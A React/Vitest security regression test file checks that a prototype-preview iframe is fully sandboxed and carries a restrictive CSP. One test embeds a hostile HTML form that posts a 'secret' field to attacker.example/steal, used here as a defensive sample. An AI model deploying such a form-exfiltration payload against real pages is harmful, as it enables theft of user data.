import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { PrototypePreview } from "../lab/PrototypePreview";

/**
 * DP-B (2026-04-30): inline `PrototypeBlock` was removed from the chat
 * stream as part of the pass-through pivot. Prototypes now render as
 * an `ArtifactReferenceBlock` in chat (sidebar carries the full body),
 * and the underlying sandboxed iframe lives at `lab/PrototypePreview`
 * for the future drill-in surface. The CSP / sandbox security
 * guarantees still need regression coverage — they're tested directly
 * against `PrototypePreview` below.
 */
describe("PrototypePreview inline-HTML sandbox (security regression)", () => {
  it("renders the sandboxed iframe when given inline HTML", () => {
    const html = "<!doctype html><html><head></head><body><h1>Variant A</h1></body></html>";
    const { container } = render(
      <PrototypePreview inlineHtml={html} title="Onboarding flow A" />,
    );
    const iframe = container.querySelector("iframe.prototype-frame");
    expect(iframe).not.toBeNull();
    // Restrictive sandbox: no token at all — no scripts, no forms, no popups.
    expect(iframe!.getAttribute("sandbox")).toBe("");
    // CSP meta is injected into the rendered srcdoc.
    const srcdoc = iframe!.getAttribute("srcdoc") ?? "";
    expect(srcdoc).toContain("Content-Security-Policy");
    expect(srcdoc).toContain("form-action 'none'");
    expect(srcdoc).toContain("script-src 'none'");
    expect(srcdoc).toContain("<h1>Variant A</h1>");
    expect(iframe!.getAttribute("title")).toBe("Onboarding flow A");
  });

  it("hardens against form-action XSS — sandbox excludes allow-forms and CSP blocks form submission", () => {
    const malicious =
      '<form action="https://attacker.example/steal" method="POST"><input name="x" value="secret"></form>';
    const { container } = render(
      <PrototypePreview inlineHtml={malicious} title="Bad form" />,
    );
    const iframe = container.querySelector("iframe.prototype-frame");
    expect(iframe).not.toBeNull();
    const sandbox = iframe!.getAttribute("sandbox") ?? "<missing>";
    expect(sandbox).not.toContain("allow-forms");
    expect(sandbox).toBe("");
    const srcdoc = iframe!.getAttribute("srcdoc") ?? "";
    expect(srcdoc).toContain("form-action 'none'");
  });
});
